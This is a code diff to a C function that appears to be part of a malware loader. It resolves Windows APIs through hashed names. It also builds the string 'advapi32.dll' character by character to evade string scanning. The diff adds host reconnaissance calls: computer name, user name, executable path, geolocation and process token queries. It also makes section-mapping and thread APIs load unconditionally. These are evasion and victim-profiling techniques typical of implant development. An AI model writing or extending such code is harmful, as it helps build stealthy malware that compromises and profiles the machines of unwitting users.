@@ -44,15 +44,28 @@ BOOL LdrAllocateCoreStructsAndLoadApis() {
 	ldr->win32->NtWriteVirtualMemory = (pNtWriteVirtualMemory)GetProc(ntdll, HASHED_NtWriteVirtualMemory);
 	ldr->win32->CloseHandle = (pCloseHandle)GetProc(kernel32, HASHED_CloseHandle);
 	ldr->win32->NtDelayExecution = (pNtDelayExecution)GetProc(ntdll, HASHED_NtDelayExecution);
-
-#ifdef LOAD_AND_LISTEN
 	ldr->win32->CreateThread = (pCreateThread)GetProc(kernel32, HASHED_CreateThread);
 	ldr->win32->RegisterWaitForSingleObject = (pRegisterWaitForSingleObject)GetProc(kernel32, HASHED_RegisterWaitForSingleObject);
 	ldr->win32->FreeLibrary = (pFreeLibrary)GetProc(kernel32, HASHED_FreeLibrary);
 	ldr->win32->CreateFileA = (pCreateFileA)GetProc(kernel32, HASHED_CreateFileA);
 	ldr->win32->NtCreateSection = (pNtCreateSection)GetProc(ntdll, HASHED_NtCreateSection);
 	ldr->win32->NtMapViewOfSection = (pNtMapViewOfSection)GetProc(ntdll, HASHED_NtMapViewOfSection);
-#endif
+	ldr->win32->GetComputerNameExA = (pGetComputerNameExA)GetProc(kernel32, HASHED_GetComputerNameExA);
+	CHAR advapi[13];
+	advapi[0]  = 'a'; advapi[1]  = 'd'; advapi[2]  = 'v';
+	advapi[3]  = 'a'; advapi[4]  = 'p'; advapi[5]  = 'i';
+	advapi[6]  = '3'; advapi[7]  = '2'; advapi[8]  = '.';
+	advapi[9]  = 'd'; advapi[10] = 'l'; advapi[11] = 'l';
+	advapi[12] = '\0';
+	HMODULE advapi32 = ldr->win32->LoadLibraryA(advapi);
+	ldr->win32->GetUserNameA   = (pGetUserNameA)GetProc(advapi32, HASHED_GetUserNameA);
+	ldr->win32->GetModuleFileNameA = (pGetModuleFileNameA)GetProc(kernel32, HASHED_GetModuleFileNameA);
+	ldr->win32->GetUserGeoId = (pGetUserGeoId)GetProc(kernel32, HASHED_GetUserGeoID);
+	ldr->win32->GetGeoInfoA  = (pGetGeoInfoA)GetProc(kernel32, HASHED_GetGeoInfoA);
+	ldr->win32->NtOpenProcessToken = (pNtOpenProcessToken)GetProc(ntdll, HASHED_NtOpenProcessToken);
+	ldr->win32->NtQueryInformationToken = (pNtQueryInformationToken)GetProc(ntdll, HASHED_NtQueryInformationToken);
+
+
 
 	return TRUE;
 }
